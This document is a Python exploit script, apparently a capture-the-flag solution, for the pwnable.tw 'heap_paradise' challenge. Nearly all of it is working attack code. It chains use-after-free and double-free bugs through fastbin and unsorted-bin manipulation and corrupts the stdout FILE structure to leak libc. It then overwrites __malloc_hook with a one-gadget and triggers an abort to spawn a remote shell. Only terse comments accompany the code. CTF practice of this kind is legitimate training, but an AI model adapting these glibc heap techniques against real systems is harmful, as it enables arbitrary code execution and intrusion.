#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *

exe = context.binary = ELF('./heap_paradise')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10308)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

def choice(option):
    sla("You Choice:", str(option))

def add(size, data):
    choice(1)
    sla("Size :", str(size))
    sa("Data :", data)

def delete(idx):
    choice(2)
    sla("Index :", str(idx))

"""
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RUNPATH:  b'./'
FORTIFY:  Enabled
Bug : Use After Free, Double Free
 
"""

libc = ELF(exe.libc.path)
io = start()

add(0x80-8, (p64(0x0) + p64(0x81))*7)
add(0x68, (p64(0x0) + p64(0x81))*6) #chunk faked as unsorted bin
add(0x80-8, (p64(0x0) + p64(0x81))*7)
delete(0)
delete(2)
delete(0)
delete(1) #put the chunk in fastbin
add(0x80-8, '\x60')
add(0x80-8, (p64(0x0) + p64(0x21))*7)
add(0x80-8, (p64(0x0) + p64(0x81))*7)
add(0x80-8, (p64(0x0) + p64(0x71) + p64(0x0) + p64(0xa1))) #craft fake unsorted bin
delete(1) #unsorted bin fd overwrites the fastbin fd. now fastbin fd points to libc address
delete(6) #use the fake chunk crafted above '\x60' fake chunk
add(0x80-8, (p64(0x0) + p64(0x71)) * 2 + b"\xdd\x25") #make the unsorted bin size to 0x71 and partial overwrite fd to point to fake chunck near stdout file structure
add(0x68, "A")
add(0x68, b"\x00" * 51 + p64(0xfbad1800) + p64(0x0)*3 + b"\x00") #malicious stdout file structure now puts will cause a leak as usual i dont understand fsop
reu("\x7f")
ren(2)
leak = uu64(ren(6))
libc.address = leak - 0x3c46a3
log.info(f"libc base : {hex(libc.address)} ")
delete(1) #put a chunk in 0x70 fastbin
delete(6) #fake chunk '\x60'
add(0x80-8, p64(0x0) + p64(0x71) + p64(0x0) + p64(0x71) + p64(libc.address + 0x3c3aed)) # use the fake chunk to overwrite the fd of the 0x70 fastbin to fake chunk near __malloc_hook without doing a fastbin dup
add(0x68, "A"*8) #meh
add(0x68, b"\x00"*19 + p64(libc.address + 0xef6c4)) #one gadget
delete(0) 
delete(0) # causing free to abort (double free). during abort malloc is called to allocate the mappings and it calls one gadget 
io.interactive()

"""
0xef6c4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL
""" 